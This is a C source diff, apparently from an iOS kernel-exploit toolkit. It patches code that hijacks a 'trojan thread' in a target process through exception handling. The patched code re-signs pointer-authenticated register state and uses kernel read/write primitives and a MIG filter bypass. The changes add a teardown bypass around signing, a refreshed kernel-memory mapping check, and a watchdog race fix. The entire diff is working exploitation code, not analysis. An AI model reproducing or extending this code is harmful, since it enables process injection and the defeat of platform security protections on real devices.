@@ -2249,6 +2249,10 @@ static void rc_reply_crash_repark(ExceptionMessage *e, uint64_t parkPC,
            (unsigned long long)e->codeFirst, (unsigned long long)e->codeSecond,
            (unsigned long long)e->threadState.__pc,
            (unsigned long long)parkPC, (unsigned long long)parkLR);
+    // Teardown-owned repair may run on the late-trap responder thread, which
+    // is not the thread that began destroy/abandon. Enter the owner-scoped
+    // bypass on this thread for the one sign it needs (F-04/F-07).
+    excport_teardown_bypass_begin("crash-repark");
     arm_thread_state64_internal st = e->threadState;
     if (sign_state(g_RC_trojanThreadAddr, &st, parkPC, parkLR)) {
         reply_with_state(e, &st);
@@ -2257,6 +2261,7 @@ static void rc_reply_crash_repark(ExceptionMessage *e, uint64_t parkPC,
                "re-trap returns to our port\n");
         reply_with_state(e, &e->threadState);
     }
+    excport_teardown_bypass_end("crash-repark");
     g_RC_success = false;
 }
 
@@ -2651,7 +2656,20 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
     return retValue;
 }
 
+static bool restore_trojan_thread_internal(arm_thread_state64_internal *state);
+
+// Teardown-owned restore may run from init abort paths as well as destroy.
+// Enter the owner-scoped bypass on this thread so its PAC re-sign is admitted
+// even after the lifecycle gate has closed (F-04/F-07).
 bool restore_trojan_thread(arm_thread_state64_internal *state)
+{
+    excport_teardown_bypass_begin("restore-trojan");
+    bool result = restore_trojan_thread_internal(state);
+    excport_teardown_bypass_end("restore-trojan");
+    return result;
+}
+
+static bool restore_trojan_thread_internal(arm_thread_state64_internal *state)
 {
     int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
     if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
@@ -3098,25 +3116,49 @@ typedef enum {
     RC_SYNTH_UNKNOWN,
 } RcSyntheticThreadState;
 
+// ksafe is a boot-time snapshot. A thread allocated after it reads as "not
+// mapped"; the landmine sweep refreshes once and re-checks before ending its
+// walk for exactly that reason. Do the same here, but keep the answer
+// three-valued: if the refresh itself cannot run (rate limit / KRW), the
+// address is UNKNOWN, never GONE. Review R-01.
+typedef enum {
+    RC_KS_MAPPED,
+    RC_KS_UNMAPPED,
+    RC_KS_UNKNOWN,
+} RcKsafeRegion;
+
+static RcKsafeRegion rc_ksafe_region(uint64_t addr, size_t len)
+{
+    if (!ksafe_available()) return RC_KS_MAPPED;   // no map = no gate
+    if (kaddr_is_mapped(addr, len)) return RC_KS_MAPPED;
+    if (!ksafe_refresh()) return RC_KS_UNKNOWN;
+    return kaddr_is_mapped(addr, len) ? RC_KS_MAPPED : RC_KS_UNMAPPED;
+}
+
 static RcSyntheticThreadState rc_thread_owner_state(uint64_t thread, uint64_t task)
 {
     if (!thread) return RC_SYNTH_GONE;
     if (!kexploit_krw_peek_live()) return RC_SYNTH_UNKNOWN;
     if (!is_kaddr_valid(thread)) return RC_SYNTH_GONE;
-    if (ksafe_available() && !kaddr_is_mapped(thread, off_thread_t_tro + 8))
-        return RC_SYNTH_GONE;
+    RcKsafeRegion threadRegion = rc_ksafe_region(thread, off_thread_t_tro + 8);
+    if (threadRegion == RC_KS_UNKNOWN) return RC_SYNTH_UNKNOWN;
+    if (threadRegion == RC_KS_UNMAPPED) return RC_SYNTH_GONE;
     RcSyntheticThreadState result = RC_SYNTH_UNKNOWN;
     krw_set_nonfatal(true);
     uint64_t tro = 0, owner = 0;
     if (early_kread_checked(thread + off_thread_t_tro, &tro, sizeof(tro))) {
         if (!is_kaddr_valid(tro)) {
             result = RC_SYNTH_GONE;
-        } else if (ksafe_available() &&
-                   !kaddr_is_mapped(tro, off_thread_ro_tro_task + 8)) {
-            result = RC_SYNTH_GONE;
-        } else if (early_kread_checked(tro + off_thread_ro_tro_task,
-                                       &owner, sizeof(owner))) {
-            result = owner == task ? RC_SYNTH_ALIVE : RC_SYNTH_GONE;
+        } else {
+            RcKsafeRegion troRegion = rc_ksafe_region(tro, off_thread_ro_tro_task + 8);
+            if (troRegion == RC_KS_UNKNOWN) {
+                result = RC_SYNTH_UNKNOWN;
+            } else if (troRegion == RC_KS_UNMAPPED) {
+                result = RC_SYNTH_GONE;
+            } else if (early_kread_checked(tro + off_thread_ro_tro_task,
+                                           &owner, sizeof(owner))) {
+                result = owner == task ? RC_SYNTH_ALIVE : RC_SYNTH_GONE;
+            }
         }
     }
     krw_set_nonfatal(false);
@@ -4333,6 +4375,10 @@ static void rc_restore_trapped_thread_for_abort(mach_port_t port, int trapStage,
 #define RC_INIT_WATCHDOG_SECONDS 12
 
 static _Atomic uint64_t g_rc_init_watchdog_gen = 0;
+// Set immediately after init_remote_call_internal() returns (before the gen is
+// retired under the mutex). The watchdog checks it under the same mutex so an
+// init returning at the 12 s boundary is not treated as wedged. Review R-08.
+static _Atomic uint64_t g_rc_init_completed_gen = 0;
 static _Atomic bool g_rc_init_wedged = false;
 // Review F-01: the watchdog is a fresh pthread with no pushed RemoteCallState,
 // so the g_RC_* macros there resolved to g_RC_defaultState — it drained
@@ -4477,7 +4523,8 @@ static void *rc_init_watchdog_main(void *arg) {
     // be freed as soon as init returns). The task_exc_guard ref is claimed
     // here too (atomic, exactly once vs a racing teardown).
     pthread_mutex_lock(&g_rc_init_watchdog_mutex);
-    if (atomic_load_explicit(&g_rc_init_watchdog_gen, memory_order_acquire) != gen) {
+    if (atomic_load_explicit(&g_rc_init_watchdog_gen, memory_order_acquire) != gen ||
+        atomic_load_explicit(&g_rc_init_completed_gen, memory_order_acquire) == gen) {
         pthread_mutex_unlock(&g_rc_init_watchdog_mutex);
         return NULL;   // init returned while we were waking — healthy
     }
@@ -4697,6 +4744,10 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     }
     g_RC_processGeneration = 0;
     int rc = init_remote_call_internal(process, useMigFilterBypass);
+    // R-08: publish completion before taking the retirement mutex. If the
+    // watchdog already holds it, it will see this flag and not repair a healthy
+    // init that returned at the boundary.
+    atomic_store_explicit(&g_rc_init_completed_gen, wdGen, memory_order_release);
     // F-01: retire the generation under the watchdog's snapshot mutex — after
     // this the watchdog cannot be (or start) reading this state.
     pthread_mutex_lock(&g_rc_init_watchdog_mutex);
